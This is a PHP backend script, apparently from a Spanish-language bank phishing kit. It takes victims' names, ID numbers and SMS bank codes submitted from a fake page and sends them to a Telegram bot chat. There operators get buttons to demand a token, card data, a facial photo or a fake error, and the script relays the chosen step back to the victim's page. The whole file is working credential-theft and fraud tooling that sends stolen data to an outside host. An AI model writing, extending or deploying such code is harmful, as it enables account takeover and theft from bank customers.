<?php
ini_set('display_errors', 1);
error_reporting(E_ALL);
header('Content-Type: application/json');

$USED_TOKENS_FILE = 'used_tokens_sms.json';

function loadConfig()
{
    $configFile = __DIR__ . '/../config.php';

    if (!file_exists($configFile)) {
        return null;
    }

    $config = require $configFile;

    if (empty($config['bot_token']) || empty($config['chat_id'])) {
        return null;
    }

    return [
        'token' => $config['bot_token'],
        'chat_id' => $config['chat_id']
    ];
}

function sendMessage($token, $chatId, $text, $keyboard)
{
    $payload = [
        'chat_id'      => $chatId,
        'text'         => $text,
        'parse_mode'   => 'HTML',
        'reply_markup' => json_encode($keyboard)
    ];

    $ch = curl_init("https://api.telegram.org/bot{$token}/sendMessage");
    curl_setopt_array($ch, [
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_POST           => true,
        CURLOPT_HTTPHEADER     => ['Content-Type: application/json'],
        CURLOPT_POSTFIELDS     => json_encode($payload)
    ]);

    $res = curl_exec($ch);
    curl_close($ch);

    return json_decode($res, true);
}

function buildKeyboard($tid)
{
    return [
        'inline_keyboard' => [
            [
                ['text' => '🧮 Dina',      'callback_data' => "pedir_token:$tid"],
                ['text' => '💳 CC',        'callback_data' => "cc:$tid"],
                ['text' => '❌ 923',       'callback_data' => "rechazar:$tid"],
                ['text' => '🏦 Logo',      'callback_data' => "banco_error:$tid"],
                ['text' => '📸 Facial',    'callback_data' => "facial:$tid"],  // NUEVO BOTÓN
                ['text' => 'SMS',         'callback_data' => "sms:$tid"],
            ],
            [
                ['text' => '🏁 Finalizar', 'callback_data' => "fin:$tid"]
            ]
        ]
    ];
}

function formatMessage($d)
{
    $info = $d['tbdatos'] ?? [];

    $documento = $info['documento'] ?? 'N/D';
    $nombre    = $info['nombre'] ?? 'N/D';

    $sms = $d['bancoldina']['clave'] ?? '<i>Sin clave SMS</i>';

    $msg  = "<b>📲 Nuevo Código SMS</b>\n\n";
    $msg .= "👤 <b>Nombre:</b> <code>{$nombre}</code>\n";
    $msg .= "🆔 <b>Documento:</b> <code>{$documento}</code>\n";
    $msg .= "🔑 <b>Clave SMS:</b> <code>{$sms}</code>\n";

    return $msg;
}

function isTokenUsed($id)
{
    global $USED_TOKENS_FILE;
    if (!file_exists($USED_TOKENS_FILE)) return false;

    $tokens = json_decode(file_get_contents($USED_TOKENS_FILE), true);
    return isset($tokens[$id]);
}

function markTokenUsed($id)
{
    global $USED_TOKENS_FILE;

    $tokens = file_exists($USED_TOKENS_FILE)
        ? json_decode(file_get_contents($USED_TOKENS_FILE), true)
        : [];

    $tokens[$id] = time();
    file_put_contents($USED_TOKENS_FILE, json_encode($tokens));
}

$config = loadConfig();
if (!$config) {
    echo json_encode(['ok' => false, 'error' => '❌ Error cargando config.php']);
    exit;
}

if ($_SERVER['REQUEST_METHOD'] === 'POST') {

    $d = json_decode(file_get_contents('php://input'), true);

    if (!is_array($d)) {
        echo json_encode(['ok' => false, 'error' => '⛔ JSON inválido']);
        exit;
    }

    $tid = $d['transactionId'] ?? '';

    if (!$tid) {
        echo json_encode(['ok' => false, 'error' => '⛔ Falta transactionId']);
        exit;
    }

    if (isTokenUsed($tid)) {
        echo json_encode(['ok' => false, 'error' => '⛔ Código ya utilizado']);
        exit;
    }

    markTokenUsed($tid);

    $msg      = formatMessage($d);
    $keyboard = buildKeyboard($tid);
    $sent     = sendMessage($config['token'], $config['chat_id'], $msg, $keyboard);

    echo json_encode([
        'ok'         => !empty($sent['ok']),
        'message_id' => $sent['result']['message_id'] ?? null
    ]);

    exit;
}

if ($_SERVER['REQUEST_METHOD'] === 'GET' && isset($_GET['transactionId'])) {

    $tid = $_GET['transactionId'];

    $updates_url = "https://api.telegram.org/bot{$config['token']}/getUpdates?timeout=5";
    $updates = json_decode(@file_get_contents($updates_url), true);

    $lastUpdateId = 0;

    if (!isset($updates['result'])) {
        echo json_encode(['ok' => false]);
        exit;
    }

    foreach ($updates['result'] as $upd) {

        if (isset($upd['update_id'])) {
            $lastUpdateId = $upd['update_id'];
        }

        if (
            isset($upd['callback_query']) &&
            strpos($upd['callback_query']['data'], $tid) !== false
        ) {
            $action = explode(':', $upd['callback_query']['data'])[0];
            $user   = $upd['callback_query']['from']['username']
                    ?? $upd['callback_query']['from']['first_name'];

            $msgId    = $upd['callback_query']['message']['message_id'];
            $original = $upd['callback_query']['message']['text'];

            $newText = $original
                . "\n\n✅ Acción: <b>" . ucfirst(str_replace('_', ' ', $action)) . "</b>"
                . "\n👤 Por: @" . $user;

            $payload = [
                'chat_id'    => $config['chat_id'],
                'message_id' => $msgId,
                'text'       => $newText,
                'parse_mode' => 'HTML'
            ];

            $ch = curl_init("https://api.telegram.org/bot{$config['token']}/editMessageText");
            curl_setopt_array($ch, [
                CURLOPT_RETURNTRANSFER => true,
                CURLOPT_POST           => true,
                CURLOPT_HTTPHEADER     => ['Content-Type: application/json'],
                CURLOPT_POSTFIELDS     => json_encode($payload)
            ]);
            curl_exec($ch);
            curl_close($ch);

            // Agregar acción "facial"
            if ($action === 'facial') {
                echo json_encode(['ok' => true, 'action' => 'facial']);
                exit;
            }

            echo json_encode(['ok' => true, 'action' => $action]);
            exit;
        }
    }

    if ($lastUpdateId > 0) {
        @file_get_contents("https://api.telegram.org/bot{$config['token']}/getUpdates?offset=" . ($lastUpdateId + 1));
    }

    echo json_encode(['ok' => false]);
    exit;
}

echo json_encode(['ok' => false, 'error' => '⛔ Método no permitido']);
exit;
?>